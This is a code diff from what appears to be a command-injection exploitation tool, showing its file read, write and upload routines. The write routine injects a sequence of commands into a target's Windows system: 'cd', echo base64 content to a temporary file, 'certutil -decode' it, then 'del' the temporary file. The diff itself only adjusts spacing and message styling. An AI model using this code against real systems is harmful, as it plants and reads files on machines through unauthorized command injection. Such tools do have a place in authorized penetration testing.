@@ -51,8 +51,8 @@ def file_read(separator, payload, TAG, delay, prefix, suffix, whitespace, http_r
   if settings.VERBOSITY_LEVEL >= 1:
     print ""
   if shell:
-    success_msg = "The contents of file '" + Style.UNDERLINE 
-    success_msg += file_to_read + Style.RESET_ALL + "' : "
+    success_msg = "The contents of file '"  
+    success_msg += file_to_read + "'" + Style.RESET_ALL + ": "
     sys.stdout.write(settings.print_success_msg(success_msg))
     print shell
     output_file = open(filename, "a")
@@ -103,19 +103,19 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, whitespace, http_
     path = os.path.dirname(dest_to_write)
     path = path.replace("/","\\")
     # Chnage directory
-    cmd = "cd " + path + separator +separator + settings.WIN_COMMENT
+    cmd = "cd " + path + separator +separator + " " + settings.WIN_COMMENT
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     # Find filename
     filname = os.path.basename(dest_to_write)
     tmp_filname = "tmp_" + filname
-    cmd = settings.FILE_WRITE + " " + content + ">" + tmp_filname + separator + settings.WIN_COMMENT
+    cmd = settings.FILE_WRITE + " " + content + ">" + tmp_filname + separator + " " + settings.WIN_COMMENT
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     # Decode base 64 encoding
-    cmd = "certutil -decode "  + tmp_filname + " " + filname + separator + settings.WIN_COMMENT
+    cmd = "certutil -decode "  + tmp_filname + " " + filname + separator + " " + settings.WIN_COMMENT
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)  
     #fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     # Delete tmp file
-    cmd = "del "  + tmp_filname + separator + settings.WIN_COMMENT
+    cmd = "del "  + tmp_filname + separator + " " + settings.WIN_COMMENT
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)  
     #fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     # Check if file exists
@@ -136,7 +136,7 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, whitespace, http_
   if shell:
     if settings.VERBOSITY_LEVEL >= 1:
       print ""
-    success_msg = "The " + Style.UNDERLINE + shell + Style.RESET_ALL
+    success_msg = "The " +  shell + Style.RESET_ALL
     success_msg += Style.BRIGHT + " file was created successfully!" + "\n" 
     sys.stdout.write(settings.print_success_msg(success_msg))
     sys.stdout.flush()
@@ -188,7 +188,7 @@ def file_upload(separator, payload, TAG, delay, prefix, suffix, whitespace, http
     if shell:
       if settings.VERBOSITY_LEVEL >= 1:
         print ""
-      success_msg = "The " + Style.UNDERLINE + shell
+      success_msg = "The " +  shell
       success_msg += Style.RESET_ALL + Style.BRIGHT + " file was uploaded successfully!" 
       sys.stdout.write(settings.print_success_msg(success_msg) + "\n")
       sys.stdout.flush()
